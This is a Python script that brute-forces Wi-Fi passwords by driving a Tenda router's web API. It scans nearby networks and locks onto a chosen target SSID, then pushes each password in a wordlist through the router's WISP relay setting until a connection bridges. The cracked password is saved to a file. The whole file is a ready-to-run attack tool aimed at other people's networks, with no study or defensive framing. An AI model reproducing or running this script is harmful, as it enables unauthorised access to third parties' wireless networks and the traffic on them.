import requests
import time
import json
import sys
from datetime import datetime
import os

class color:
	gren = '\033[92m'
	cyan = '\033[96m'
	wrng = '\033[93m'
	fail = '\033[91m'
	endc = '\033[0m'
	udln = '\033[1m'
	bold = '\033[4m'
class date:
	clock = datetime.now()
	day = str(clock.day)
	month = str(clock.month)
	year = str(clock.year)
	hour = str(clock.hour)
	minute = str(clock.minute)
	second = str(clock.second)
	today = str(clock.today)
def get_files(path):
	for file in os.listdir(path):
		if os.path.isfile(os.path.join(path, file)):
			yield file
			pass
		pass
	pass
def scan(get,wfo1,wfo2,save,datsav):
	i = 0
	while get:
		print(wfo1+str(i+1)+wfo2+" "+get['wifiScan'][i]["wifiScanSignalStrength"]+" # "+get['wifiScan'][i]["wifiScanSSID"])
		i=i+1
		pass
	pass
def check(ssid,pswd,info,gren,wrng,whit,save):
	cek = requests.get("http://192.168.0.1/goform/getStatus?random=0.3479907979886645&modules=internetStatus%2CdeviceStatistics%2CsystemInfo%2CwanAdvCfg%2CwifiRelay")
	cek = json.loads(cek.content)
	if cek['wifiRelay']["wifiRelayConnectStatus"] == 'bridgeSuccess':
		print(info+" Connecton: "+gren+cek['wifiRelay']["wifiRelayConnectStatus"]+whit)
		text = open("/home/roger/Public/wordlist/password/"+ssid+".txt", "a+")
		text.write(pswd+"\n\r")
		print(save+" Password Saved: /home/roger/Public/wordlist/password/"+ssid+".txt")
		text.close()
		os.system("mpv /home/roger/Public/BF-TENDA/ok.mp3")
		sys.exit()
		pass
	print(info+" Connecton: "+wrng+cek['wifiRelay']["wifiRelayConnectStatus"]+whit)
	pass
def creck(ssid,pswd,info):
	post = requests.post("http://192.168.0.1/goform/setWifiRelay", data = "wifiRelaySSID="+ssid+"&wifiRelayMAC=undefined&wifiRelaySecurityMode=wpawpa2%2Faestkip&wifiRelayChannel=0&module1=wifiRelay&wifiRelayPwd="+pswd+"&wifiRelayType=wisp")
	print(info+" Response: "+str(post.status_code))
	pass
def timer(start_minute, start_second, info):
	total_second = start_minute* 60 + start_second
	while total_second:
		mins, secs = divmod(total_second, 60)
		print(f' Delay: {mins:02d}:{secs:02d}', end='\r'+info)
		time.sleep(1)
		total_second -= 1
		pass
	print(" Done!")
	pass

datsav = date.day+"-"+date.month+"-"+date.year
date = date.hour+":"+date.minute+":"+date.second
info = "["+color.cyan+date+color.endc+"] ["+color.gren+"INFO"+color.endc+"]"
wfo1 = "["+color.cyan+date+color.endc+"] ["+color.fail
wfo2 = color.endc+"]"
save = "["+color.cyan+date+color.endc+"] ["+color.wrng+"SAVED"+color.endc+"]"
lock = "["+color.cyan+date+color.endc+"] ["+color.wrng+"LOCK"+color.endc+"]"
what = "["+color.cyan+date+color.endc+"] ["+color.wrng+"?"+color.endc+"]"
pswd_path = "/home/roger/Public/wordlist/password/"
try:
	print(info+" Wait is scanning SSID Name")
	get = requests.get("http://192.168.0.1/goform/getWifiRelay?random=0.2657587569337556&modules=wifiScan")
	get = json.loads(get.content)
	scan(get,wfo1,wfo2,save,datsav)
except Exception as e:
	print(what, end=" ")
	ssid = input("Attack number: ")
	ssid = get['wifiScan'][int(ssid)-1]["wifiScanSSID"]
	print(lock+" SSID Locked "+color.gren+ssid+color.endc)
	h=0
	for file in get_files(pswd_path):
		print(wfo1+str(h+1)+wfo2+" "+file)
		h+=1
	print(what, end=" ")
	pswd = input("Wordlist number: ")
	res = os.listdir(pswd_path)
	print(lock+" Wordlist locked "+color.gren+res[int(pswd)-1]+color.endc)
	files = open(pswd_path+"/"+res[int(pswd)-1])
	with files as file:
		i=1
		for line in file:
			pswd = line.rstrip()
			print(info+" SSID: "+str(color.bold+ssid+color.endc))
			if len(pswd) < 8:
				print(info+" Password "+str(pswd+color.fail)+" skipping"+color.endc)
				pass
			else:	
				print(info+" Try again "+str(color.bold+pswd+color.endc))
				creck(ssid,pswd,info)
				if __name__ == '__main__':
					timer(00,60,info)
				check(ssid,pswd,info,color.gren,color.wrng,color.endc,save)
				pass
		i += 1
		pass
	pass
	sys.exit()
	raise